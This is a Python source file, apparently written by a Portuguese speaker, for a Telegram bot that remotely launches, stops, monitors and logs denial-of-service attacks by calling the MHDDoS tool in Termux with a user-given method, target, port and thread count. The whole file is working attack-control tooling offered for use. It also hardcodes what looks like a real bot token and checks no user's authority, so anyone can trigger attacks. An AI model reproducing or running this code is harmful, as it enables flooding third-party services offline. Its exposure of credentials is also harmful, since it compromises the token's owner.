import os
import subprocess
import psutil
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

# Configurar o bot do Telegram
TOKEN = "8057897719:AAGBcdBN9cSCD8Ge3wp9jgwVEG2LjP5MDIw"
MHDDoS_PATH = "/data/data/com.termux/files/home/MHDDoS/start.py"
LOG_PATH = "/data/data/com.termux/files/home/MHDDoS/attack.log"
METHODS_PATH = "/data/data/com.termux/files/home/MHDDoS/methods.txt"

# Criar a aplicação do bot
app = Application.builder().token(TOKEN).build()

# ➜ Comando para iniciar ataque
async def attack(update: Update, context: CallbackContext):
    args = context.args
    if len(args) < 4:
        await update.message.reply_text("Uso correto: /attack <metodo> <alvo> <porta> <threads>")
        return

    metodo, alvo, porta, threads = args
    await update.message.reply_text(f"🔥 Iniciando ataque com **{metodo}** no alvo **{alvo}:{porta}** com **{threads} threads**!")

    try:
        with open(LOG_PATH, "w") as log_file:
            subprocess.Popen(["python3", MHDDoS_PATH, metodo, alvo, porta, threads], stdout=log_file, stderr=log_file)
        await update.message.reply_text("✅ Ataque iniciado com sucesso!")
    except Exception as e:
        await update.message.reply_text(f"❌ Erro ao iniciar o ataque: {e}")

# ➜ Comando para parar ataque
async def stop_attack(update: Update, context: CallbackContext):
    killed = 0
    for proc in psutil.process_iter(attrs=['pid', 'name']):
        if "python" in proc.info["name"]:
            proc.kill()
            killed += 1

    if killed:
        await update.message.reply_text(f"✅ {killed} processos do ataque foram encerrados!")
    else:
        await update.message.reply_text("❌ Nenhum ataque em andamento.")

# ➜ Comando para listar métodos
async def list_methods(update: Update, context: CallbackContext):
    try:
        with open(METHODS_PATH, "r") as file:
            methods = file.read().splitlines()
        
        mensagem = "📌 **Métodos disponíveis:**\n" + "\n".join(methods)
        await update.message.reply_text(mensagem)
    except Exception as e:
        await update.message.reply_text(f"❌ Erro ao listar métodos: {e}")

# ➜ Comando para checar status
async def check_status(update: Update, context: CallbackContext):
    running = False
    for proc in psutil.process_iter(attrs=['name']):
        if "python" in proc.info["name"]:
            running = True
            break

    if running:
        await update.message.reply_text("🔥 Um ataque está em andamento!")
    else:
        await update.message.reply_text("✅ Nenhum ataque ativo no momento.")

# ➜ Comando para enviar logs
async def send_log(update: Update, context: CallbackContext):
    if os.path.exists(LOG_PATH):
        await update.message.reply_document(document=open(LOG_PATH, "rb"))
    else:
        await update.message.reply_text("❌ Nenhum log encontrado.")

# ➜ Adicionar comandos ao bot
app.add_handler(CommandHandler("attack", attack))
app.add_handler(CommandHandler("stop", stop_attack))
app.add_handler(CommandHandler("methods", list_methods))
app.add_handler(CommandHandler("status", check_status))
app.add_handler(CommandHandler("log", send_log))

# ➜ Rodar o bot
print("🤖 Bot está rodando no Telegram...")
app.run_polling()
